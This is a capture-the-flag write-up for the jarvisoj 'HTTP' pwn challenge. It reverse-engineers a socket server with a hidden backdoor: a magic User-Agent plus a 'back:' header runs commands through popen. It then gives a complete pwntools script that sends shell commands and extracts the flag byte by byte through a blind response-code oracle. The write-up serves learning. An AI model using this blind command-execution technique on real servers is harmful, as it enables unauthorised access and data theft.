---
layout:     post
title:      jarvisoj HTTP
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>Problem Address:  
>https://www.jarvisoj.com  
>  
>Problem Description:  
>题目来源：cncert2016  
>  
>Download:  
>https://dn.jarvisoj.com/challengefiles/http.49cb96c66532dfb92e4879c8693436ff  
>  
>Address:  
>pwn.jarvisoj.com:9881  
<!-- more -->


### 0x00 IDA分析

定位到 main 方法, 发现是一个socket通讯的服务端程序

![](/assets/img/writeup/pwn/2017-08-04-jarvisoj-http/0x00.png)

绑定并且监听 1807 port

![](/assets/img/writeup/pwn/2017-08-04-jarvisoj-http/0x01.png)

调用 fork 方法处理客户端请求, sub_40137C(::fd) -> handle(::fd) 方法对客户端数据进行处理

![](/assets/img/writeup/pwn/2017-08-04-jarvisoj-http/0x02.png)

跟进入, 首先将Request-header从buf读进s, 调用sub_40116C方法进行处理

注意: Request-header 尾部以 \r\n\r\n 标志结束

![](/assets/img/writeup/pwn/2017-08-04-jarvisoj-http/0x03.png)

对 User-agent 的处理

![](/assets/img/writeup/pwn/2017-08-04-jarvisoj-http/0x04.png)

if处的第2个条件, 判断 User-agent 的内容 v4 是否与特定字符串相同 

![](/assets/img/writeup/pwn/2017-08-04-jarvisoj-http/0x05.png)

if处的第3个条件, 判断  User-agnent 的内容是否含有子串 "back: "

![](/assets/img/writeup/pwn/2017-08-04-jarvisoj-http/0x06.png)

判断成功后, 调用 popen 方法执行任意命令

![](/assets/img/writeup/pwn/2017-08-04-jarvisoj-http/0x07.png)

再看看回显方法

![](/assets/img/writeup/pwn/2017-08-04-jarvisoj-http/0x08.png)

显然可以根据回显不同来对flag进行逐位猜解


### 0x01 exploit

```
#!/usr/bin/env python

from pwn import *
import os

context.log_level = 21

def get_password():
    counter = 0
    password = ""
    for i in "2016CCRT":
        password += chr(ord(i) ^ counter)
        counter += 1
    return password

def get_payload(command, password):
    payload = ""
    payload += "GET / HTTP/1.1\r\n"
    payload += "User-Agent: %s\r\n" % (password)
    payload += "back: %s\r\n" % (command)
    payload += "\r\n"
    payload += "\r\n"
    return payload

def send_payload(payload):
    Io = remote(HOST, PORT)
    Io.sendline(payload)
    result = Io.read()
    Io.close()
    return result

def execute(command):
    payload = get_payload(command, PASSWORD)
    print "[+] Payload : %s" % (repr(payload))
    return send_payload(payload)
    
def guess_one_byte(index, char):
    command = "cat flag|awk '{if(substr($1,%d,1)>\"%s\") print \"%s\"}'" % (
        index + 1, char, "A")
    print "[+] Executing : [%s]" % (command)
    response = execute(command)
    return (response[len("HTTP/1.1 ")] != "5")

def clear_screen():
    os.system("clear")

def guess(LENGTH):
    flag = ""
    for i in range(LENGTH + 1):
        RIGHT = 0x7F
        LEFT = 0x20
        P = (LEFT + RIGHT) / 2
        while True:
            clear_screen()
            print "[+] Flag : [%s]" % (flag)
            if guess_one_byte(i, chr(P)):
                LEFT = P
            else:
                RIGHT = P
            P = (LEFT + RIGHT) / 2
            print abs(RIGHT - LEFT)
            if abs(RIGHT - LEFT) < 2:
            	flag += chr(P + 1)
                break
    clear_screen()
    print "[+] Flag : [%s]" % (flag)
    return flag

PASSWORD = get_password()

# DEBUG = True
DEBUG = False

if DEBUG:
    HOST = "localhost"
    PORT = 1807
else:
	HOST = "pwn.jarvisoj.com"
	PORT = 9881
LENGTH = 39
print guess(LENGTH)
```

getflag

![](/assets/img/writeup/pwn/2017-08-04-jarvisoj-http/0x09.png)